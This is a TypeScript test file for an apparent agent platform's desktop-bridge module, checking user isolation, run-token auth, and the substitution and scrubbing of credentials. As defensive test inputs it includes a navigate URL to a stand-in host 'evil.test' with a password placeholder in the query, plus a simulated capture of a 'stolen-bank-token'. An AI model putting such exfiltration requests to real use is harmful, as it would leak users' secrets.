// SPDX-License-Identifier: Apache-2.0

/**
 * Desktop module — HTTP surfaces in front of the in-memory client
 * registry, loaded through the module contract (`getTestApp({ modules })`).
 *
 *   - `/api/desktop/me/*` — user-scoped, cookie-authenticated. A desktop
 *     belongs to a person: user A must never reach user B's client.
 *   - `/internal/desktop-command` — run-token authenticated, called by
 *     the sidecar's `desktop_browser` tool. Dispatches to the run
 *     OWNER's desktop, and carries the credential-substitution path:
 *     `{{field}}` placeholders resolved server-side, real values
 *     reaching the (fake) desktop, and every reply scrubbed so the
 *     agent can never read a substituted secret back.
 *
 * The WebSocket upgrade itself is not exercised here (Hono's
 * `app.request()` cannot upgrade); the registry is driven directly
 * through `registerClient`, which is exactly what the upgrade handler
 * does once auth resolves.
 */

import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { getTestApp } from "../../../../../test/helpers/app.ts";
import { db, truncateAll } from "../../../../../test/helpers/db.ts";
import {
  createTestContext,
  authHeaders,
  type TestContext,
} from "../../../../../test/helpers/auth.ts";
import { seedAgent, seedRun, seedPackage } from "../../../../../test/helpers/seed.ts";
import {
  localIntegrationManifest,
  httpHeaderDelivery,
} from "../../../../../test/helpers/integration-manifests.ts";
import { signRunToken } from "../../../../lib/run-token.ts";
import { installPackage } from "../../../../services/application-packages.ts";
import { encryptCredentialEnvelope } from "@appstrate/connect";
import { integrationConnections } from "@appstrate/db/schema";
import { eq } from "drizzle-orm";
import desktopModule from "../../index.ts";
import { uploadStream } from "@appstrate/db/storage";
import { clearDownloads, DOWNLOADS_BUCKET, handleDesktopNotification } from "../../downloads.ts";
import {
  registerClient,
  unregisterClient,
  isConnected,
  handleClientFrame,
  setNotificationHandler,
} from "../../registry.ts";
import { clearRunSecrets } from "../../secret-scrub.ts";

const app = getTestApp({ modules: [desktopModule] });

const AGENT = "@deskorg/test-agent";
const INTEGRATION = "@deskorg/somesite";
const OTHER_INTEGRATION = "@deskorg/other-site";
const SECRET = "S3cret!Pass-2026";

function buildAgentManifest(declaredIntegrations: string[]): Record<string, unknown> {
  const deps: Record<string, string> = {};
  const sel: Record<string, { tools?: string[] }> = {};
  for (const id of declaredIntegrations) {
    deps[id] = "^1.0.0";
    sel[id] = { tools: ["search"] };
  }
  return {
    name: AGENT,
    version: "1.0.0",
    type: "agent",
    schema_version: "0.1",
    display_name: "Desktop Test Agent",
    dependencies: { integrations: deps },
    integrations: sel,
  };
}

function buildIntegrationManifest(id: string) {
  return localIntegrationManifest({
    name: id,
    serverName: `${id}-server`,
    version: "1.0.0",
    auths: {
      primary: {
        type: "api_key",
        authorizedUris: ["https://somesite.example/**"],
        credentialFields: ["password"],
        delivery: httpHeaderDelivery({ name: "Authorization", field: "password" }),
      },
    },
    tools_policy: { search: {} },
  });
}

/**
 * Stand-in for the Electron client: records what the platform sends and
 * answers every command with a canned (or computed) result, mimicking
 * the JSON-RPC reply the real bridge posts back over the socket.
 */
function fakeDesktop(userId: string, reply: unknown | ((frame: { params: unknown }) => unknown)) {
  const sent: Array<{ id: string; method: string; params: unknown }> = [];
  const client = {
    userId,
    send(payload: string): void {
      const frame = JSON.parse(payload) as { id: string; method: string; params: unknown };
      sent.push(frame);
      // Reply on the next tick so the awaiting `sendCommand` promise is
      // already registered.
      void Promise.resolve().then(() => {
        const result = typeof reply === "function" ? reply(frame) : reply;
        handleClientFrame(userId, { id: frame.id, result });
      });
    },
    close(): void {},
  };
  registerClient(client);
  return { client, sent };
}

describe("Desktop module — /api/desktop/me/*", () => {
  let ctx: TestContext;
  let connected: ReturnType<typeof fakeDesktop> | null = null;

  beforeEach(async () => {
    await truncateAll();
    ctx = await createTestContext({ orgSlug: "deskorg" });
    connected = null;
  });

  afterEach(() => {
    if (connected) unregisterClient(ctx.user.id, connected.client);
  });

  it("requires authentication", async () => {
    const res = await app.request("/api/desktop/me/status");
    expect(res.status).toBe(401);
  });

  it("reports disconnected when no desktop is registered", async () => {
    const res = await app.request("/api/desktop/me/status", { headers: authHeaders(ctx) });
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ connected: false });
  });

  it("reports connected once a client registers, and forwards commands to it", async () => {
    connected = fakeDesktop(ctx.user.id, { url: "https://example.com" });

    const status = await app.request("/api/desktop/me/status", { headers: authHeaders(ctx) });
    expect(await status.json()).toEqual({ connected: true });

    const res = await app.request("/api/desktop/me/command", {
      method: "POST",
      headers: { ...authHeaders(ctx), "Content-Type": "application/json" },
      body: JSON.stringify({ method: "browser.navigate", params: { url: "https://example.com" } }),
    });
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ result: { url: "https://example.com" } });
    expect(connected.sent).toHaveLength(1);
    expect(connected.sent[0]!.method).toBe("browser.navigate");
  });

  it("returns 503 when the caller has no desktop connected", async () => {
    const res = await app.request("/api/desktop/me/command", {
      method: "POST",
      headers: { ...authHeaders(ctx), "Content-Type": "application/json" },
      body: JSON.stringify({ method: "browser.navigate", params: { url: "https://example.com" } }),
    });
    expect(res.status).toBe(503);
  });

  it("rejects a body without a `method`", async () => {
    const res = await app.request("/api/desktop/me/command", {
      method: "POST",
      headers: { ...authHeaders(ctx), "Content-Type": "application/json" },
      body: JSON.stringify({ params: { url: "https://example.com" } }),
    });
    expect(res.status).toBe(400);
  });

  // CSWSH: the upgrade is a cookie-authenticated GET that CORS does not
  // cover, so a page on another origin could otherwise register itself
  // as the victim's desktop — displacing their real client and
  // receiving every command dispatched to them.
  it("refuses a bridge upgrade from an untrusted origin", async () => {
    const res = await app.request("/api/desktop/bridge", {
      headers: { ...authHeaders(ctx), Origin: "https://evil.test", Upgrade: "websocket" },
    });
    expect(res.status).toBe(403);
    expect(isConnected(ctx.user.id)).toBe(false);
  });

  it("never reaches another user's desktop", async () => {
    const other = await createTestContext({ orgSlug: "otherorg" });
    connected = fakeDesktop(ctx.user.id, { ok: true });

    const status = await app.request("/api/desktop/me/status", { headers: authHeaders(other) });
    expect(await status.json()).toEqual({ connected: false });

    const res = await app.request("/api/desktop/me/command", {
      method: "POST",
      headers: { ...authHeaders(other), "Content-Type": "application/json" },
      body: JSON.stringify({ method: "browser.navigate", params: { url: "https://evil.test" } }),
    });
    expect(res.status).toBe(503);
    expect(connected.sent).toHaveLength(0);
  });
});

describe("Desktop module — POST /internal/desktop-command", () => {
  let ctx: TestContext;
  let runId: string;
  let token: string;
  let connected: ReturnType<typeof fakeDesktop> | null = null;

  // `getTestApp` mounts module routers but does not run module `init()`;
  // mirror the one piece of init wiring the download tests depend on.
  setNotificationHandler(handleDesktopNotification);

  async function seedIntegration(id: string): Promise<void> {
    await seedPackage({
      id,
      orgId: ctx.orgId,
      type: "integration",
      source: "local",
      draftManifest: buildIntegrationManifest(id),
    });
    await installPackage({ orgId: ctx.orgId, applicationId: ctx.defaultAppId }, id);
    await db.insert(integrationConnections).values({
      integrationId: id,
      authKey: "primary",
      accountId: "acct-test",
      applicationId: ctx.defaultAppId,
      userId: ctx.user.id,
      endUserId: null,
      credentialsEncrypted: encryptCredentialEnvelope({ outputs: { password: SECRET } }),
      scopesGranted: [],
    });
  }

  beforeEach(async () => {
    await truncateAll();
    ctx = await createTestContext({ orgSlug: "deskorg" });
    await seedAgent({
      id: AGENT,
      orgId: ctx.orgId,
      createdBy: ctx.user.id,
      draftManifest: buildAgentManifest([INTEGRATION]),
    });
    await installPackage({ orgId: ctx.orgId, applicationId: ctx.defaultAppId }, AGENT);
    const run = await seedRun({
      packageId: AGENT,
      orgId: ctx.orgId,
      applicationId: ctx.defaultAppId,
      userId: ctx.user.id,
      status: "running",
    });
    runId = run.id;
    token = signRunToken(runId);
    connected = null;
  });

  afterEach(() => {
    if (connected) unregisterClient(ctx.user.id, connected.client);
    clearRunSecrets(runId);
  });

  async function post(body: unknown): Promise<Response> {
    return app.request("/internal/desktop-command", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  }

  it("returns 401 without a run token", async () => {
    const res = await app.request("/internal/desktop-command", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ method: "browser.navigate" }),
    });
    expect(res.status).toBe(401);
  });

  it("dispatches to the run owner's desktop", async () => {
    connected = fakeDesktop(ctx.user.id, { title: "Example Domain" });
    const res = await post({ method: "browser.evaluate", params: { script: "document.title" } });
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ result: { title: "Example Domain" } });
  });

  it("returns 503 when the owner has no desktop connected", async () => {
    const res = await post({ method: "browser.screenshot" });
    expect(res.status).toBe(503);
  });

  it("refuses a run with no owning user — there is no desktop to drive", async () => {
    const ownerless = await seedRun({
      packageId: AGENT,
      orgId: ctx.orgId,
      applicationId: ctx.defaultAppId,
      userId: null,
      status: "running",
    });
    connected = fakeDesktop(ctx.user.id, { ok: true });
    const res = await app.request("/internal/desktop-command", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${signRunToken(ownerless.id)}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ method: "browser.navigate", params: { url: "https://example.com" } }),
    });
    expect(res.status).toBe(403);
    expect(connected.sent).toHaveLength(0);
  });

  // ─── Credential substitution ───────────────────────────

  it("substitutes {{field}} server-side: the desktop receives the real value, the agent never wrote it", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, { filled: true });

    const res = await post({
      method: "browser.fill",
      params: { selector: "#password", value: "{{password}}" },
      integration_id: INTEGRATION,
      substitute_params: true,
    });

    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ result: { filled: true } });
    // The frame that crossed the wire to the desktop carries the REAL
    // secret — that is the whole point (it must reach the DOM) …
    const dispatched = connected.sent[0]!.params as { value: string };
    expect(dispatched.value).toBe(SECRET);
  });

  it("scrubs the secret out of the reply when the page echoes it back", async () => {
    await seedIntegration(INTEGRATION);
    // Desktop echoes the substituted value (e.g. a page script returning
    // the input's .value).
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => ({
      echoed: (frame.params as { value: string }).value,
    }));

    const res = await post({
      method: "browser.fill",
      params: { selector: "#password", value: "{{password}}" },
      integration_id: INTEGRATION,
      substitute_params: true,
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as { result: { echoed: string } };
    expect(body.result.echoed).not.toContain(SECRET);
    expect(body.result.echoed).toContain("[redacted:");
  });

  it("scrubs LATER replies too — reading the field back cannot exfiltrate", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, { filled: true });

    // 1. Fill with substitution — registers the secret for this run.
    await post({
      method: "browser.fill",
      params: { selector: "#password", value: "{{password}}" },
      integration_id: INTEGRATION,
      substitute_params: true,
    });

    // 2. A separate, substitution-free evaluate whose reply carries the
    // secret (the desktop "reads the input back").
    unregisterClient(ctx.user.id, connected.client);
    connected = fakeDesktop(ctx.user.id, { value: SECRET });
    const res = await post({
      method: "browser.evaluate",
      params: { script: "document.querySelector('#password').value" },
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as { result: { value: string } };
    expect(body.result.value).not.toContain(SECRET);
  });

  it("404 when the integration is not declared by the running agent", async () => {
    await seedIntegration(OTHER_INTEGRATION);
    connected = fakeDesktop(ctx.user.id, { ok: true });

    const res = await post({
      method: "browser.fill",
      params: { selector: "#password", value: "{{password}}" },
      integration_id: OTHER_INTEGRATION,
      substitute_params: true,
    });

    expect(res.status).toBe(404);
    expect(connected.sent).toHaveLength(0);
  });

  // ─── Téléchargements (plan de contrôle + plan de données) ──────────

  it("browser.download dispatches an upload target and download_status tracks notifications", async () => {
    clearDownloads();
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      const p = frame.params as { download_id: string; upload_url: string };
      expect(p.upload_url).toContain("token=");
      return { download_id: p.download_id, state: "started" };
    });

    const res = await post({
      method: "browser.download",
      params: { url: "https://example.com/doc.pdf", filename: "doc.pdf" },
    });
    expect(res.status).toBe(200);
    const { result } = (await res.json()) as {
      result: { download_id: string; state: string; filename: string };
    };
    expect(result.state).toBe("started");
    expect(result.filename).toBe("doc.pdf");

    // Notification de progression puis de complétion, attribuées au bon user.
    handleClientFrame(ctx.user.id, {
      method: "download.progress",
      params: { download_id: result.download_id, pct: 50 },
    });
    let st = await post({
      method: "browser.download_status",
      params: { download_id: result.download_id },
    });
    expect(((await st.json()) as { result: { state: string; pct: number } }).result).toMatchObject({
      state: "downloading",
      pct: 50,
    });

    handleClientFrame(ctx.user.id, {
      method: "download.completed",
      params: { download_id: result.download_id, size: 11, sha256: "abc" },
    });
    st = await post({
      method: "browser.download_status",
      params: { download_id: result.download_id },
    });
    expect(((await st.json()) as { result: { state: string } }).result.state).toBe("uploaded");
  });

  it("browser.download accepts capture mode (no url — the page will trigger it)", async () => {
    clearDownloads();
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      const p = frame.params as { download_id: string; capture?: boolean; url?: string };
      expect(p.capture).toBe(true);
      expect(p.url).toBeUndefined();
      return { download_id: p.download_id, state: "started" };
    });
    const res = await post({
      method: "browser.download",
      params: { capture: true, filename: "invoice.pdf" },
    });
    expect(res.status).toBe(200);
    const { result } = (await res.json()) as { result: { state: string } };
    expect(result.state).toBe("started");
  });

  it("browser.download without url nor capture is a 400", async () => {
    connected = fakeDesktop(ctx.user.id, { ok: true });
    const res = await post({ method: "browser.download", params: { filename: "x.pdf" } });
    expect(res.status).toBe(400);
  });

  it("a notification from another user cannot advance a download", async () => {
    clearDownloads();
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => ({
      download_id: (frame.params as { download_id: string }).download_id,
      state: "started",
    }));
    const res = await post({ method: "browser.download", params: { url: "https://x.test/a" } });
    const { result } = (await res.json()) as { result: { download_id: string } };

    handleClientFrame("someone-else", {
      method: "download.completed",
      params: { download_id: result.download_id, size: 1, sha256: "x" },
    });
    const st = await post({
      method: "browser.download_status",
      params: { download_id: result.download_id },
    });
    expect(((await st.json()) as { result: { state: string } }).result.state).toBe("started");
  });

  it("streams the uploaded bytes to the run, and only to the owning run", async () => {
    clearDownloads();
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => ({
      download_id: (frame.params as { download_id: string }).download_id,
      state: "started",
    }));
    const res = await post({
      method: "browser.download",
      params: { url: "https://x.test/f.bin", filename: "f.bin" },
    });
    const { result } = (await res.json()) as { result: { download_id: string } };
    const id = result.download_id;

    // Le « desktop » dépose les octets dans le storage (plan de données)
    // puis notifie la complétion.
    const bytes = new TextEncoder().encode("hello desktop download");
    await uploadStream(
      DOWNLOADS_BUCKET,
      `${runId}/${id}/f.bin`,
      new Response(bytes).body as ReadableStream<Uint8Array>,
    );
    handleClientFrame(ctx.user.id, {
      method: "download.completed",
      params: { download_id: id, size: bytes.length, sha256: "s" },
    });

    const fetched = await app.request(`/internal/desktop-download/${id}`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    expect(fetched.status).toBe(200);
    expect(await fetched.text()).toBe("hello desktop download");

    // Un token d'un AUTRE run ne voit pas ce téléchargement.
    const otherRun = await seedRun({
      packageId: AGENT,
      orgId: ctx.orgId,
      applicationId: ctx.defaultAppId,
      userId: ctx.user.id,
      status: "running",
    });
    const denied = await app.request(`/internal/desktop-download/${id}`, {
      headers: { Authorization: `Bearer ${signRunToken(otherRun.id)}` },
    });
    expect(denied.status).toBe(404);
  });

  // ─── Allowlist de substitution ─────────────────────────

  it("refuses substitution on an outbound-capable method (navigate)", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, { ok: true });
    const res = await post({
      method: "browser.navigate",
      params: { url: "https://evil.test/?p={{password}}" },
      integration_id: INTEGRATION,
      substitute_params: true,
    });
    expect(res.status).toBe(400);
    expect(connected.sent).toHaveLength(0);
  });

  it("batch: substitutes fill steps but leaves navigate placeholders literal", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      const steps = (frame.params as { steps: Array<{ params: unknown }> }).steps;
      const nav = steps[0]!.params as { url: string };
      const fill = steps[1]!.params as { value: string };
      // L'URL sortante garde son gabarit intact (aucun secret) ;
      // le champ local reçoit la vraie valeur.
      expect(nav.url).toContain("{{password}}");
      expect(fill.value).toBe(SECRET);
      return { completed: 2, results: [{}, {}] };
    });
    const res = await post({
      method: "browser.batch",
      params: {
        steps: [
          { method: "browser.navigate", params: { url: "https://x.test/?p={{password}}" } },
          { method: "browser.fill", params: { selector: "#pw", value: "{{password}}" } },
        ],
      },
      integration_id: INTEGRATION,
      substitute_params: true,
    });
    expect(res.status).toBe(200);
  });

  // ─── browser.capture_credential ────────────────────────

  it("captures an in-page token into the credential store, returns only field names", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      // The platform dispatches browser.capture; the desktop returns
      // { url, fields } with the URL from wc.getURL() (trusted, not the
      // script). The page URL must fall in the integration's
      // authorized_uris (seedIntegration uses https://somesite.example/**).
      const script = (frame.params as { script?: string }).script;
      expect(typeof script).toBe("string");
      return {
        url: "https://somesite.example/dashboard",
        fields: { access_token: "live-oidc-token-xyz" },
      };
    });

    const res = await post({
      method: "browser.capture_credential",
      params: {
        integration_id: INTEGRATION,
        auth_key: "primary",
        script: "readTokenFromPage()",
      },
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as { result: { captured: boolean; fields: string[] } };
    expect(body.result.captured).toBe(true);
    expect(body.result.fields).toEqual(["access_token"]);
    // The value NEVER appears in the agent-facing response.
    expect(JSON.stringify(body)).not.toContain("live-oidc-token-xyz");

    // It landed in the store, injectable for the rest of the run.
    const conns = await db
      .select()
      .from(integrationConnections)
      .where(eq(integrationConnections.integrationId, INTEGRATION));
    const captured = conns.find((c) => c.authKey === "primary");
    expect(captured).toBeDefined();
  });

  it("rejects a capture whose page is outside the integration's authorized_uris", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, () => ({
      url: "https://bank.example/account",
      fields: { access_token: "stolen-bank-token" },
    }));
    const res = await post({
      method: "browser.capture_credential",
      params: { integration_id: INTEGRATION, auth_key: "primary", script: "grab()" },
    });
    expect(res.status).toBe(403);
    // The stolen token was never written to any connection.
    const conns = await db
      .select()
      .from(integrationConnections)
      .where(eq(integrationConnections.integrationId, INTEGRATION));
    expect(JSON.stringify(conns)).not.toContain("stolen-bank-token");
  });

  it("rejects capture for an integration the agent does not declare", async () => {
    await seedIntegration(OTHER_INTEGRATION);
    connected = fakeDesktop(ctx.user.id, { access_token: "x" });
    const res = await post({
      method: "browser.capture_credential",
      params: { integration_id: OTHER_INTEGRATION, auth_key: "primary", script: "x()" },
    });
    expect(res.status).toBe(404);
  });

  it("400 when the capture is missing script/auth_key", async () => {
    connected = fakeDesktop(ctx.user.id, { access_token: "x" });
    const res = await post({
      method: "browser.capture_credential",
      params: { integration_id: INTEGRATION },
    });
    expect(res.status).toBe(400);
  });

  // ─── browser.batch ─────────────────────────────────────

  it("batch: substitutes per step, dispatches ONE frame, scrubs the result array", async () => {
    await seedIntegration(INTEGRATION);
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      const steps = (frame.params as { steps: Array<{ method: string; params: unknown }> }).steps;
      // La substitution a eu lieu AVANT le fil : la vraie valeur arrive au desktop.
      const fill = steps[1]!.params as { value: string };
      expect(fill.value).toBe(SECRET);
      // Le desktop renvoie un écho du secret : il doit être caviardé au retour.
      return { completed: steps.length, results: [{ loaded: true }, { echoed: fill.value }] };
    });

    const res = await post({
      method: "browser.batch",
      params: {
        steps: [
          { method: "browser.navigate", params: { url: "https://somesite.example/login" } },
          { method: "browser.fill", params: { selector: "#pw", value: "{{password}}" } },
        ],
      },
      integration_id: INTEGRATION,
      substitute_params: true,
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      result: { completed: number; results: Array<Record<string, unknown>> };
    };
    expect(body.result.completed).toBe(2);
    expect(JSON.stringify(body.result)).not.toContain(SECRET);
    expect(connected.sent).toHaveLength(1);
  });

  it("batch: a download step gets its upload target minted platform-side", async () => {
    clearDownloads();
    connected = fakeDesktop(ctx.user.id, (frame: { params: unknown }) => {
      const steps = (frame.params as { steps: Array<{ params: unknown }> }).steps;
      const dl = steps[0]!.params as {
        download_id?: string;
        upload_url?: string;
        capture?: boolean;
      };
      expect(dl.download_id).toMatch(/^dl_/);
      expect(dl.upload_url).toContain("token=");
      expect(dl.capture).toBe(true);
      return { completed: 1, results: [{ download_id: dl.download_id, state: "started" }] };
    });
    const res = await post({
      method: "browser.batch",
      params: {
        steps: [{ method: "browser.download", params: { capture: true, filename: "f.pdf" } }],
      },
    });
    expect(res.status).toBe(200);
  });

  it("batch: rejects nested batches and unknown step methods", async () => {
    connected = fakeDesktop(ctx.user.id, { ok: true });
    for (const method of ["browser.batch", "browser.download_status", "explode"]) {
      const res = await post({
        method: "browser.batch",
        params: { steps: [{ method, params: {} }] },
      });
      expect(res.status).toBe(400);
    }
    expect(connected.sent).toHaveLength(0);
  });

  it("batch: caps the step count", async () => {
    connected = fakeDesktop(ctx.user.id, { ok: true });
    const steps = Array.from({ length: 41 }, () => ({
      method: "browser.evaluate",
      params: { script: "1" },
    }));
    const res = await post({ method: "browser.batch", params: { steps } });
    expect(res.status).toBe(400);
    expect(connected.sent).toHaveLength(0);
  });

  it("400 when substitute_params is set without integration_id", async () => {
    connected = fakeDesktop(ctx.user.id, { ok: true });
    const res = await post({
      method: "browser.fill",
      params: { selector: "#password", value: "{{password}}" },
      substitute_params: true,
    });
    expect(res.status).toBe(400);
    expect(connected.sent).toHaveLength(0);
  });
});
